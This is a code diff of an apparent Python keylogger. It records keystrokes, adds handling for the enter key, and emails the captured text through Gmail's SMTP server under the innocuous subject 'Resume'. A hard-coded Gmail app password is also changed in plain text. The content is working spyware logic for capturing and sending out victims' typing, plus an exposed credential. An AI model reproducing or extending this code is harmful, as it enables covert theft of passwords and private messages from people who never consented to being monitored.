@@ -16,6 +16,9 @@ while True:
         if event.name == 'space':
             cont += 1
             event.name = ' '
+        if event.name == 'enter':
+            cont += 1
+            event.name = ' -enter- '
         if event.name == 'backspace':
             event.name = ' -backspace- '
         if (event.name == 'enter') or (cont == 5):
@@ -35,7 +38,7 @@ while True:
         smtp_server = 'smtp.gmail.com'
         smtp_port = 587                   # deja esto como esta
         smtp_username = 'mail@gmail.com' # tu mail
-        smtp_password = 'gfyfabslhznhjhua' # este es un codigo que NO es tu contraseña de mail, en el READ ME explico de donde sacarlo
+        smtp_password = 'gfyfabslhznhjhia' # este es un codigo que NO es tu contraseña de mail, en el READ ME explico de donde sacarlo
 
         
         subject = 'Resume'
